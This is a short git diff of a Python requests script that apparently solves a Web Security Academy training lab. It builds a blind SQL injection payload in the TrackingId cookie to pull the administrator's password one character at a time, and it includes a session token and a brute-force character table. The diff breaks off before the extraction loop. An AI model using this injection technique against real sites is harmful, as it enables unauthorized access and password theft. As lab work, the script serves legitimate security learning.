@@ -1,13 +1,16 @@
 import requests
 import string
 
+# Request Params:
+
 host = '0a05009c04863a7a81f9618b001400d5.web-security-academy.net'
-url = F'https://{host}'
+url = F"https://{host}"
 trackingId = '7oX33iPbx9ww83J8'
+session = 'K1BLyvnSgY7ZZnpWCOrMhA3bFA2oOstp'
 
 cookies = {
     'TrackingId': F"{trackingId}'%20AND%20(SELECT%20SUBSTRING(password%2c1%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'a",
-    'session': 'K1BLyvnSgY7ZZnpWCOrMhA3bFA2oOstp',
+    'session': session,
 }
 
 headers = {
@@ -26,8 +29,9 @@ headers = {
     # 'Cookie': "TrackingId=7oX33iPbx9ww83J8'%20AND%20(SELECT%20SUBSTRING(password%2c1%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'a; session=K1BLyvnSgY7ZZnpWCOrMhA3bFA2oOstp",
 }
 
-c_table = string.ascii_lowercase + string.digits
+# Intruder code:
 
+c_table = string.ascii_lowercase + string.digits
 current = ''  
 password = ''
 
